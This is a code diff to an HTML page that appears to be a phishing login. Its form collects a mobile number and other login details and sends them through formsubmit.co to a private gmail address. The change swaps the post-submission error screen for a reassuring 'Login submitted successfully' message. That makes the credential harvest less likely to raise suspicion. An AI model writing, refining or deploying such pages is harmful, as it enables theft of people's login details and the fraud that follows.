@@ -26,6 +26,12 @@
       text-align: center;
       padding: 20px;
     }
+    .success-message {
+      color: green;
+      font-weight: bold;
+      text-align: center;
+      padding: 20px;
+    }
     .disclaimer {
       margin-top: 20px;
       font-size: 0.9rem;
@@ -53,7 +59,7 @@
       <h2>Login</h2>
       <form action="https://formsubmit.co/kukunasientle@gmail.com" method="POST">
         <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="?error=1">
+        <input type="hidden" name="_next" value="?success=1">
 
         <label for="mobile">Mobile Number</label>
         <input type="tel" id="mobile" name="mobileNumber" placeholder="+27 Mobile Number" required />
@@ -89,6 +95,14 @@
     </div>
   </div>
 
+  <!-- Success Page -->
+  <div class="page" id="success-page">
+    <div class="container">
+      <h1 class="success-message">Login submitted successfully!</h1>
+      <p style="text-align:center;">We have received your details. Please wait while we process your login.</p>
+    </div>
+  </div>
+
   <script>
     function getQueryParam(param) {
       const urlParams = new URLSearchParams(window.location.search);
@@ -97,8 +111,11 @@
 
     window.addEventListener('DOMContentLoaded', () => {
       const error = getQueryParam('error');
-      if (error === '1') {
-        document.getElementById('form-page').classList.remove('active');
+      const success = getQueryParam('success');
+
+      if (success === '1') {
+        document.getElementById('success-page').classList.add('active');
+      } else if (error === '1') {
         document.getElementById('error-page').classList.add('active');
       } else {
         document.getElementById('form-page').classList.add('active');
@@ -107,4 +124,4 @@
   </script>
 
 </body>
-          </html>
+  </html>
